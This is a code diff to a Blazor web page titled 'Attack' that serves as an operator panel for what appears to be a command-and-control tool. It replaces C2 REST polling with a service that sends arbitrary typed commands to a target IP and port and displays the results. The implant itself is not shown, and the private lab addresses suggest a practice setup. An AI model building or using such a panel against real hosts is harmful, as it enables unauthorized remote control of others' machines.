@@ -3,7 +3,7 @@
 <PageTitle>Attack</PageTitle>
 
 @using Remote.Data
-@inject RestService Rest
+@inject RemoteCommandService RemoteCommand
 
 <style>
 	textarea {
@@ -22,12 +22,12 @@
 <h1>Remote command page</h1>
 
 <div>
-	<h3>Set C2 IP Address</h3>
+	<h3>Set Target IP Address</h3>
 	<input @bind="target_ip" class="form-control" /> 
 	<br />
-	<h3>Set C2 Port</h3>
+	<h3>Set Target Port</h3>
 	<input @bind="target_port" class="form-control" />
-	<p>(test)target ip: @Rest.targetip, target port: @Rest.targetport</p>
+	<p>(test)target ip: @RemoteCommand.targetip, target port: @RemoteCommand.targetport</p>
 	<button @onclick="SetTarget" class="btn btn-primary">set target</button>
 </div>
 
@@ -37,7 +37,7 @@
 	<h3>Remote Command</h3>
 	<input @bind="remote_command" class="form-control" />
 	<br />
-	<button @onclick="CommandPost" class="btn btn-primary">execute</button>
+	<button @onclick="CommandSend" class="btn btn-primary">execute</button>
 	<br /><br />
 	<textarea readonly>@result</textarea>
 </div>
@@ -46,33 +46,20 @@
 
 
 @code {
-	private string? target_ip = "192.168.98.128";
-	private string? target_port = "3232";
+	private string? target_ip = "192.168.98.144";
+	private string? target_port = "9999";
 	private string? remote_command;
 	private string? result = "initial result";
 
 
 	void SetTarget(){
-		Rest.targetip = target_ip;
-		Rest.targetport = target_port;
+		RemoteCommand.targetip = target_ip;
+		RemoteCommand.targetport = target_port;
 	}
 
-	void CommandPost(){
-		if (String.IsNullOrEmpty(remote_command)){
-			return;
-		}
-		Rest.targetcommand = remote_command;
-		//remote_command = "";
-
-		Rest.Post("/c2/updatecommand");
-		while (String.IsNullOrEmpty(Rest.targetcommandresult))
-		{
-			Rest.Get("/c2/commandresult");
-		}
-		// get commandresult in Rest.targetcommandresult
-		result = Rest.targetcommandresult;
-		Rest.targetcommandresult = "";
-
+	void CommandSend(){
+		RemoteCommand.command = remote_command;
+		result = RemoteCommand.ExecuteCommand();
 	}
 }
 
